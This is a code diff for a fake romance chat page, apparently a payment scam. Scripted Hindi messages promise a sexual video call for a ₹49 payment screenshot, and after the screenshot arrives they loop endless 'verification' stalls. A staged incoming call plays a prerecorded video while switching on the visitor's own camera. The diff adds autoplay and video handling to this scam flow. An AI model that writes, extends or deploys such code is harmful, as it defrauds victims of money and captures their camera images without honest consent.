@@ -2,6 +2,7 @@ const chat = document.getElementById("chat");
 const imgInput = document.getElementById("img");
 const ringtone = document.getElementById("ringtone");
 const selfCam = document.getElementById("selfCam");
+const bgVideo = document.getElementById("bgVideo");
 
 let step = 0;
 let verificationMode = false;
@@ -22,8 +23,14 @@ document.getElementById("name").innerText = currentUser.name;
 document.getElementById("callDp").src = currentUser.dp;
 document.getElementById("callName").innerText = currentUser.name;
 
-/* Background video bind */
-document.getElementById("bgVideo").src = currentUser.video;
+/* Background video bind (SAFE) */
+bgVideo.src = currentUser.video;
+bgVideo.load();
+
+/* Try autoplay safely */
+bgVideo.play().catch(() => {
+  console.log("Autoplay prevented (normal on mobile)");
+});
 
 /* ---------------- HELPERS ---------------- */
 
@@ -68,7 +75,6 @@ function openImg(){
 
 imgInput.onchange = function(){
   if(this.files && this.files[0]){
-
     const fileURL = URL.createObjectURL(this.files[0]);
 
     addImg(fileURL, "right");
@@ -81,7 +87,6 @@ imgInput.onchange = function(){
 /* ---------------- SEND TEXT ---------------- */
 
 function sendMsg(){
-
   const input = document.getElementById("msg");
   const rawText = input.value.trim();
 
@@ -92,23 +97,16 @@ function sendMsg(){
   addMsg(rawText, "right");
   input.value = "";
 
-  /* Screenshot trigger */
   if(userText.includes("screenshot") || userText.includes("screen")){
     verificationMode = true;
     verificationStep = 1;
 
     setTimeout(() => addMsg("Wait Verification", "left"), 500);
-
-    setTimeout(() => {
-      addMsg("20 sec.. Wait video ready", "left");
-    }, 1200);
-
+    setTimeout(() => addMsg("20 sec.. Wait video ready", "left"), 1200);
     return;
   }
 
-  /* Verification loop */
   if(verificationMode){
-
     if(verificationStep === 1){
       verificationStep = 2;
       setTimeout(() => addMsg("Wait Verification", "left"), 600);
@@ -120,22 +118,16 @@ function sendMsg(){
       setTimeout(() => addMsg("20 sec.. Wait video ready", "left"), 600);
       return;
     }
-
     return;
   }
-
-  /* Normal flow */
 
   if(step === 1){
     step = 2;
 
     setTimeout(() => {
-
       addMsg("अगर आप सेक्स वीडियो चैट करना चाहते हैं तो आपको ₹49 रुपये का पेमेंट स्क्रीनशॉट भेजे स्क्रीनशॉट भेजते ही जॉच करके वीडियो कॉल किया जाएगा 100% 👍👍👍", "left");
-
       addImg("assets/verify1.jpeg", "left");
       addImg("assets/verify2.jpeg", "left");
-
     }, 600);
 
     return;
@@ -145,21 +137,16 @@ function sendMsg(){
     step = 3;
 
     setTimeout(() => {
-
       addMsg("👉👉👉 ₹49 रुपये का पेमेंट स्क्रीनशॉट भेजे वीडियो कॉल रेडी है| मै अभी वीडियो कॉल करती हू जल्दी करे", "left");
-
       addImg("assets/verifypay1.jpeg", "left");
       addImg("assets/verifypay2.jpeg", "left");
-
     }, 600);
 
     return;
   }
 
   if(step === 3){
-    setTimeout(() => {
-      addMsg("स्क्रीनशॉट भेजे जल्दी वीडियो कॉल रेडी है", "left");
-    }, 600);
+    setTimeout(() => addMsg("स्क्रीनशॉट भेजे जल्दी वीडियो कॉल रेडी है", "left"), 600);
   }
 }
 
@@ -179,7 +166,18 @@ function acceptCall(){
   ringtone.pause();
   ringtone.currentTime = 0;
 
+  startVideo();
   startCamera();
+}
+
+/* ---------------- VIDEO SAFETY ---------------- */
+
+function startVideo(){
+  bgVideo.currentTime = 0;
+
+  bgVideo.play().catch(err => {
+    console.log("User interaction required:", err);
+  });
 }
 
 /* ---------------- CAMERA ---------------- */
@@ -199,7 +197,6 @@ async function startCamera(){
 }
 
 function endCall(){
-
   document.getElementById("videoBox").style.display = "none";
 
   if(localStream){
